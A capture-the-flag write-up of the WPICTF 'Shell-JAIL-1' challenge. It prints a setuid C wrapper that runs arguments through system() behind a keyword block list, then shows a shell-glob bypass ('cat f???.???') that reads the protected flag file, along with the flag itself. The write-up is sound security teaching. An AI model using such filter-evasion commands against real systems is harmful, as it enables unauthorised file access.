Shell-JAIL-1
=================
**Category**: Pwn  **Points**: 150

Challenge Description
------

```
Download the login private key, then run:

ssh -p 31337 -i login shjail@shelljail1.wpictf.xyz

redundant servers on 31338 and 31339

made by Ben Chaney

```

Solutions
----------

This is a simple jail break challenge. SSHed into the server and we see the flag.txt in sitting right there.

```
28369edadf5f:/home/pc_owner$ ls -la
total 28
drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .
drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..
-r-sr-sr-x    1 pc_owner pc_owner     10880 Apr 13 08:03 access
-r--r--r--    1 pc_owner pc_owner      1005 Apr 13 04:50 access.c
-r--r-----    1 pc_owner pc_owner        23 Apr 13 04:50 flag.txt

```

We can cat the contents of access.c

```
28369edadf5f:/home/pc_owner$ cat access.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>

char *gen_cmd(int argc, const char **argv){
	size_t total_size = 1;
	for(int it = 1; it < argc; it++){
		total_size+= strlen(argv[it]);
	}
	char *ret = malloc(total_size);
	total_size = 0;
	for(int it = 1; it < argc; it++){
		size_t len = strlen(argv[it]);
		memcpy(ret+total_size, argv[it], len); 
		total_size+= len;
		ret[total_size] = ' ';
		total_size++;
	}
	ret[total_size] = '\0';
	return ret;
}

int filter(const char *cmd){
	int valid = 1;
	valid &= strstr(cmd, "*") == NULL;
	valid &= strstr(cmd, "sh") == NULL;
	valid &= strstr(cmd, "/") == NULL;
	valid &= strstr(cmd, "home") == NULL;
	valid &= strstr(cmd, "pc_owner") == NULL;
	valid &= strstr(cmd, "flag") == NULL;
	valid &= strstr(cmd, "txt") == NULL;
	return valid;
}


int main(int argc, const char **argv){
	setreuid(UID, UID);
	char *cmd = gen_cmd(argc, argv);
	if (!filter(cmd)){
		exit(-1);
	}
	system(cmd);
}

```
We can see flag, txt, /...etc are all filtered. However we can use the WAF bypass technique as found in
https://medium.com/secjuice/waf-evasion-techniques-718026d693d8

My solution is simply
```
28369edadf5f:/home/pc_owner$ ./access "cat f???.???"
wpi{MaNY_WayS_T0_r3Ad}
28369edadf5f:/home/pc_owner$ 
```
`flag:wpi{MaNY_WayS_T0_r3Ad}`

